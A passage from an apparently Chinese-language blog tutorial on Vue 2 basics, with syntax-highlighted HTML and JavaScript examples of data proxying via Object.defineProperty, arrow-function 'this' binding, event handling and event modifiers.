class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>何为数据代理<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 数据代理：通过一个对象代理对另一个对象中属性的操作（读/写）--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> &gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">let</span> obj = &#123;<span class="attr">x</span>:<span class="number">100</span>&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">let</span> obj2 = &#123;<span class="attr">y</span>:<span class="number">200</span>&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">Object</span>.defineProperty(obj2,<span class="string">&#x27;x&#x27;</span>,&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">get</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">return</span> obj.x</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">set</span>(<span class="params">value</span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">obj.x = value</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>Vue中的数据代理</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Vue中的数据代理<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- </span></span></span><br><span class="line"><span class="comment"><span class="xml">1.Vue中的数据代理：</span></span></span><br><span class="line"><span class="comment"><span class="xml">通过vm对象来代理data对象中属性的操作（读/写）</span></span></span><br><span class="line"><span class="comment"><span class="xml">2.Vue中数据代理的好处：</span></span></span><br><span class="line"><span class="comment"><span class="xml">更加方便的操作data中的数据</span></span></span><br><span class="line"><span class="comment"><span class="xml">3.基本原理：</span></span></span><br><span class="line"><span class="comment"><span class="xml">通过Object.defineProperty()把data对象中所有属性添加到vm上。</span></span></span><br><span class="line"><span class="comment"><span class="xml">为每一个添加到vm上的属性，都指定一个getter/setter。</span></span></span><br><span class="line"><span class="comment"><span class="xml">在getter/setter内部去操作（读/写）data中对应的属性。</span></span></span><br><span class="line"><span class="comment"><span class="xml"> --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名称：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：&#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">data</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">address</span>:<span class="string">&#x27;宏福科技园&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/01/14/vekOomyqzcwxCT8.png" alt="image-20220114113316427"></p><h2 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h2><h3 id="简单事件处理"><a href="#简单事件处理" class="headerlink" title="简单事件处理"></a>简单事件处理</h3><p>所有被vue接管的函数最好都写成普通函数，不要写成箭头函数</p><p>vue不接管的函数最好写成箭头函数</p><p>先来个总结：</p><blockquote><p>箭头函数体内的<code>this</code>对象，就是定义<strong>该函数时所在的作用域指向的对象</strong>，而不是使用时所在的作用域指向的对象。</p></blockquote><p>下面是普通函数的列子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">&#x27;window&#x27;</span>; <span class="comment">// 其实是window.name = &#x27;window&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> A = &#123;</span><br><span class="line">   <span class="attr">name</span>: <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">   <span class="attr">sayHello</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="built_in">this</span>.name)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">A.sayHello();<span class="comment">// 输出A</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> B = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;B&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">A.sayHello.call(B);<span class="comment">//输出B</span></span><br><span class="line"></span><br><span class="line">A.sayHello.call();<span class="comment">//不传参数指向全局window对象，输出window.name也就是window</span></span><br></pre></td></tr></table></figure><p>从上面可以看到，sayHello这个方法是定义在A对象中的，当当我们使用call方法，把其指向B对象，最后输出了B；可以得出，sayHello的this只跟使用时的对象有关。</p><p>改造一下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">&#x27;window&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> A = &#123;</span><br><span class="line">   <span class="attr">name</span>: <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">   <span class="attr">sayHello</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="built_in">this</span>.name)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">A.sayHello();<span class="comment">// 还是以为输出A ? 错啦，其实输出的是window</span></span><br></pre></td></tr></table></figure><p>我相信在这里，大部分同学都会出错，以为sayHello是绑定在A上的，但其实它绑定在window上的，那到底是为什么呢？</p><p>一开始，我重点标注了“<strong>该函数所在的作用域指向的对象</strong>”，作用域是指函数内部，这里的箭头函数，也就是sayHello，所在的作用域其实是最外层的js环境，因为没有其他函数包裹；然后最外层的js环境指向的对象是winodw对象，所以这里的this指向的是window对象。</p><p>那如何改造成永远绑定A呢：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">&#x27;window&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> A = &#123;</span><br><span class="line">   <span class="attr">name</span>: <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">   <span class="attr">sayHello</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> s = <span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="built_in">this</span>.name)</span><br><span class="line">      <span class="keyword">return</span> s<span class="comment">//返回箭头函数s</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sayHello = A.sayHello();</span><br><span class="line">sayHello();<span class="comment">// 输出A </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> B = &#123;</span><br><span class="line">   <span class="attr">name</span>: <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sayHello.call(B); <span class="comment">//还是A</span></span><br><span class="line">sayHello.call(); <span class="comment">//还是A</span></span><br></pre></td></tr></table></figure><p> OK，这样就做到了永远指向A对象了，我们再根据“<strong>该函数所在的作用域指向的对象</strong>”来分析一下：</p><ol><li><strong>该函数所在的作用域：</strong>箭头函数s 所在的作用域是sayHello,因为sayHello是一个函数。</li><li>**作用域指向的对象：A.**sayHello指向的对象是A。</li></ol><p>由于箭头函数不绑定this， 它会捕获其所在（即定义的位置）上下文的this值， 作为自己的this值，</p><ol><li>所以 call() / apply() / bind() 方法对于箭头函数来说只是传入参数，对它的 this 毫无影响。</li><li>考虑到 this 是词法层面上的，严格模式中与 this 相关的规则都将被忽略。（可以忽略是否在严格模式下的影响）</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>事件的基本使用<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- </span></span></span><br><span class="line"><span class="comment"><span class="xml">事件的基本使用：</span></span></span><br><span class="line"><span class="comment"><span class="xml">1.使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名；</span></span></span><br><span class="line"><span class="comment"><span class="xml">2.事件的回调需要配置在methods对象中，最终会在vm上；</span></span></span><br><span class="line"><span class="comment"><span class="xml">3.methods中配置的函数，不要用箭头函数！否则this就不是vm了；</span></span></span><br><span class="line"><span class="comment"><span class="xml">4.methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象；</span></span></span><br><span class="line"><span class="comment"><span class="xml">5.@click=&quot;demo&quot; 和 @click=&quot;demo($event)&quot; 效果一致，但后者可以传参；</span></span></span><br><span class="line"><span class="comment"><span class="xml">--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>欢迎来到&#123;&#123;name&#125;&#125;学习<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- &lt;button v-on:click=&quot;showInfo&quot;&gt;点我提示信息&lt;/button&gt; --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showInfo1&quot;</span>&gt;</span>点我提示信息1（不传参）<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showInfo2($event,66)&quot;</span>&gt;</span>点我提示信息2（传参）<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">data</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">methods</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">showInfo1</span>(<span class="params">event</span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">// console.log(event.target.innerText)</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">// console.log(this) //此处的this是vm</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">alert(<span class="string">&#x27;同学你好！&#x27;</span>)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">showInfo2</span>(<span class="params">event,number</span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">console</span>.log(event,number)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">// console.log(event.target.innerText)</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">// console.log(this) //此处的this是vm</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">alert(<span class="string">&#x27;同学你好！！&#x27;</span>)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="事件修饰符"><a href="#事件修饰符" class="headerlink" title="事件修饰符"></a>事件修饰符</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>事件修饰符<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span></span><br><span class="line"><span class="css"><span class="xml">*&#123;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">margin-top</span>: <span class="number">20px</span>;</span></span></span><br><span class="line"><span class="css"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="selector-class">.demo1</span>&#123;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">height</span>: <span class="number">50px</span>;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">background-color</span>: skyblue;</span></span></span><br><span class="line"><span class="css"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="selector-class">.box1</span>&#123;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">padding</span>: <span class="number">5px</span>;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">background-color</span>: skyblue;</span></span></span><br><span class="line"><span class="css"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="selector-class">.box2</span>&#123;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">padding</span>: <span class="number">5px</span>;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">background-color</span>: orange;</span></span></span><br><span class="line"><span class="css"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="selector-class">.list</span>&#123;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">width</span>: <span class="number">200px</span>;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">height</span>: <span class="number">200px</span>;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">background-color</span>: peru;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">overflow</span>: auto;</span></span></span><br><span class="line"><span class="css"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="selector-tag">li</span>&#123;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">height</span>: <span class="number">100px</span>;</span></span></span><br><span class="line"><span class="css"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="css"><span class="xml"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- </span></span></span><br><span class="line"><span class="comment"><span class="xml">Vue中的事件修饰符：</span></span></span><br><span class="line"><span class="comment"><span class="xml">1.prevent：阻止默认事件（常用）；</span></span></span><br><span class="line"><span class="comment"><span class="xml">2.stop：阻止事件冒泡（常用）；</span></span></span><br><span class="line"><span class="comment"><span class="xml">3.once：事件只触发一次（常用）；</span></span></span><br><span class="line"><span class="comment"><span class="xml">4.capture：使用事件的捕获模式；</span></span></span><br><span class="line"><span class="comment"><span class="xml">5.self：只有event.target是当前操作的元素时才触发事件；</span></span></span><br><span class="line"><span class="comment"><span class="xml">6.passive：事件的默认行为立即执行，无需等待事件回调执行完毕；</span></span></span><br><span class="line"><span class="comment"><span class="xml">--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>欢迎来到&#123;&#123;name&#125;&#125;学习<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 阻止默认事件（常用） --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.atguigu.com&quot;</span> @<span class="attr">click.prevent</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span>点我提示信息<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 阻止事件冒泡（常用） --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;demo1&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click.stop</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span>点我提示信息<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 修饰符可以连续写 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- &lt;a href=&quot;http://www.atguigu.com&quot; @click.prevent.stop=&quot;showInfo&quot;&gt;点我提示信息&lt;/a&gt; 